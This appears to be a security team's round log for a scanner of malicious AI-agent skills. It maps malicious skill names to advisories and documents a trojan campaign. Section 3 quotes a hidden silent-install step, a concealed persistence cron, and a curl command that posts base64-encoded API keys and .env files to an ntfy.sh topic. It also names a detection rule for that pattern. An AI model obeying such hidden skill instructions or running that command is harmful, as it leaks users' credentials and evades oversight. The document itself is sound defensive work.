# GAP-ROUND-22 — Threat-intel sweep: Snyk arXiv report cross-check + RememberAll/secure-sync campaign

Date: 2026-08-04
Focus: competitor/intel recheck + advisory coverage cross-check against newly surfaced public analyses.

## 1. What was actually run

- Competitor recheck: `skillgate` npm still 0.2.1 (last modified 2026-03-13 — 9th
  consecutive round without an update). ClawScan upstream: no new commits affecting
  the adapter since ROUND-19 (latest: runtime update branch-lease CI guard).
- Intel sweep of newly surfaced public sources:
  - Snyk technical report (arXiv 2605.28588, 2026-05-27): 3,984 skills scanned,
    76 confirmed malicious, 8 named skills still live on clawhub.ai.
  - Alice (formerly ActiveFence) analysis of the RememberAll / secure-sync
    trojan campaign.
  - Orca, Pluto, CSA notes reviewed — pattern write-ups without new named skills.

## 2. Cross-check: Snyk arXiv live-skill list vs advisory DB

All 8 skills named as still-live in the Snyk report are already covered:

```text
moltbook-lm8            -> SKA-2026-0010
polymarket-traiding-bot -> SKA-2026-0002
clawhud                 -> SKA-2026-0003
clawhub1                -> SKA-2026-0003
base-agent              -> SKA-2026-0002
moltbookagent           -> SKA-2026-0007
publish-dist            -> SKA-2026-0007
bybit-agent             -> SKA-2026-0002
```

No action needed — DB is at parity with this report's named IOCs.

## 3. Gap found: RememberAll / secure-sync campaign missing

Alice's published analysis documents a two-stage ClawHub campaign not yet in the DB:

- `rememberall` (author cyberengage): benign-looking cron reminder skill whose
  SKILL.md hides a silent `clawhub install secure-sync --no-input || true` step
  plus a hidden daily agentic persistence cron (`sessionTarget: isolated`,
  `deliver: false`, free model to stay off billing).
- `secure-sync`: poses as credential backup; base64-encodes API keys/.env files
  and POSTs each via `curl -s -d @- https://ntfy.sh/sysheartbeat-local-9`.

Fixes in this round:

1. **SKA-2026-0022** added (`rememberall` matchable; `secure-sync` marked
   `genericName` — too generic for name matching without FP risk).
2. **exfiltration rule**: new high-severity pattern for data POSTed to a public
   ntfy.sh topic (`curl/wget/http` + `-d/--data` + `ntfy.sh/<topic>`). Plain
   ntfy.sh notification URLs (subscribe links) deliberately do not match —
   ntfy.sh is a legitimate service; only the piped-data dead-drop shape fires.

## 4. Regression results

- 137 unit tests green (new ntfy.sh positive/negative test).
- Advisory data regenerated: 66 names, 10 domains.
- Four real corpora unchanged: 6 / 0 / 14 / 5.
- SkillTrustBench unchanged: binary 0.8168, `malicious->clean` 228, 0 errors.

## 5. Remaining known gaps

- 228 semantic `malicious->clean` SkillTrustBench cases (documented since ROUND-13).
- corpus-smoke first scheduled run: 2026-08-10 06:17 UTC.
- External: npm Trusted Publisher, Cloudflare secrets, upstream clawscan PR,
  bestpractices.dev.
